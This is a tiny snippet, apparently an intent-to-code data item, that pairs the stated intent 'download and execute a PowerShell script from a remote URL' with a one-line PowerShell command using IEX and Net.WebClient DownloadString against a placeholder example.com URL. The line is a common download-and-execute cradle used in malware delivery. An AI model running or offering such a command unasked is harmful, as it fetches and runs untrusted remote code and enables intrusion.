# Natural language intent:
# Download and execute a PowerShell script from a remote URL.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1')"
